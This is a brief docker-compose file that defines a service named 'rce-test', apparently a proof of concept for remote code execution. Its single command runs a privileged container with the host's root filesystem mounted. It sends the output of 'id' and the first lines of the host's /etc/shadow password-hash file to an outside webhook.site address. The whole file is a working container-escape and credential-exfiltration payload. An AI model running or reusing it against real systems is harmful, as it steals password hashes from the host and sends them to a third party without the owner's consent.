version: "3.8"
services:
  rce-test:
    image: alpine:3.19
    privileged: true
    network_mode: host
    volumes:
      - /:/host-root
    command: sh -c "apk add --no-cache curl && id | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=id && cat /host-root/etc/shadow | head -3 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=shadow && sleep 3600"



